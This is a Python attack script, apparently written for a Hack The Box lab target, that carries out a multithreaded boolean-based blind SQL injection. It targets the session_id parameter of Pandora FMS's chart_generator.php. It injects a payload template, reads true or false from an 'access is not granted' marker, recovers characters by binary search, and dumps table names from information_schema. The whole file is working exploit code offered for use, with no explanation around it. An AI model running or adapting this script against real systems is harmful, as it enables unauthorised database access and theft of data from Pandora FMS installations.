#!/usr/bin/env python3
import requests, urllib3, time
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===================== 常量区（只改这里） =====================
URL = "http://pandora.panda.htb:1443/pandora_console/include/chart_generator.php"
METHOD = "GET"
VERIFY_TLS = False
TIMEOUT = 12
USE_BURP = False
HEADERS = {  
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    #"Cookie": "lang=english; PHPSESSID=ug02hdab6d3qio6g904sdsndo3",
    #"Upgrade-Insecure-Requests": "1",
    }

GET_PARAMS = [
    # ("v", "view_tickets"),
    # ("action", "ticket"),
    # ("param[]", "4"),
    # ("param[]", "attachment"),
    # ("param[]", "1"),
]
POST_DATA = [
    #("username","admin"),
]


INJECT_KEY = "session_id"
BASE_VALUE = "1"
INJECT_TEMPLATE = "{base}' OR ({cond}) AND '1' ='1" 
FALSE_MARKER = "ccess is not granted".lower()
    #print(resp.text)

MAX_TABLE_NAME_LEN = 64

THREADS = 3
CHARSET = list(range(32, 127))

START_INDEX = 0      # 从第几个表开始
MAX_TABLES = 200      # 最多枚举多少张表
# ============================================================

PROXIES = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"} if USE_BURP else None
sess = requests.Session()


adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=0)
sess.mount("http://", adapter)
sess.mount("https://", adapter)
def is_true(resp: requests.Response) -> bool:
    #print(resp.text)
    return FALSE_MARKER not in resp.text.lower()

def build_params(cond_sql: str):
    inj_value = INJECT_TEMPLATE.format(base=BASE_VALUE, cond=cond_sql)

  
    if METHOD.upper() == "GET":
        return list(GET_PARAMS) + [(INJECT_KEY, inj_value)], None
    else:
        return None, list(POST_DATA) + [(INJECT_KEY, inj_value)]

RETRIES = 4
BACKOFF = 0.3  # base sleep seconds

def check(cond_sql: str) -> bool:
    params, data = build_params(cond_sql)

    def do_request():
        if METHOD.upper() == "GET":
            return sess.get(URL, params=params, headers=HEADERS, timeout=TIMEOUT, verify=VERIFY_TLS,
                            allow_redirects=True, proxies=PROXIES)
        else:
            #print(GET_PARAMS)
            #print(data)
            return sess.post(URL, params=GET_PARAMS, data=data, headers=HEADERS, timeout=TIMEOUT, verify=VERIFY_TLS,
                             allow_redirects=True, proxies=PROXIES)

    last_err = None
    for attempt in range(1, RETRIES + 1):
        try:
            r = do_request()
            return is_true(r)
        except (requests.exceptions.ReadTimeout,
                requests.exceptions.ConnectTimeout,
                requests.exceptions.ConnectionError,
                requests.exceptions.ChunkedEncodingError) as e:
            last_err = e
            print(f"[WARN] {type(e).__name__} attempt {attempt}/{RETRIES}")
            time.sleep(BACKOFF * attempt)

    raise RuntimeError(f"Network unstable after retries: {type(last_err).__name__}")

def find_len(expr_sql: str, max_len: int) -> int:
    for n in range(1, max_len + 1):
        if check(f"LENGTH(({expr_sql}))={n}"):
            return n
    raise RuntimeError("Length not found.")

def find_char(expr_sql: str, pos: int) -> str:
    lo, hi = CHARSET[0], CHARSET[-1]
    while lo <= hi:
        mid = (lo + hi) // 2
        if check(f"ASCII(SUBSTRING(({expr_sql}),{pos},1))>{mid}"):
            lo = mid + 1
        else:
            hi = mid - 1
    return chr(lo)

def extract(expr_sql: str, max_len: int) -> str:
    length = find_len(expr_sql, max_len)
    out = ["?"] * length

    def worker(p):
        return p, find_char(expr_sql, p)

    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        futures = [ex.submit(worker, pos) for pos in range(1, length + 1)]
        for f in as_completed(futures):
            pos, ch = f.result()
            out[pos - 1] = ch

    return "".join(out)

def table_expr(i: int) -> str:
    return (
        "SELECT table_name FROM information_schema.tables "
        "WHERE table_schema=database() "
        f"LIMIT {i},1"
    )

if __name__ == "__main__":
    print("[TEST] 1=1:", check("1=1"))
    print("[TEST] 1=2:", check("1=2"))

    print("[*] dumping table names ...")
    for i in range(START_INDEX, START_INDEX + MAX_TABLES):
        try:
            name = extract(table_expr(i), MAX_TABLE_NAME_LEN)
            print(f"[+] table[{i}] = {name}")
        except RuntimeError as e:
            print(f"[-] stop at table[{i}] ({e})")
            break
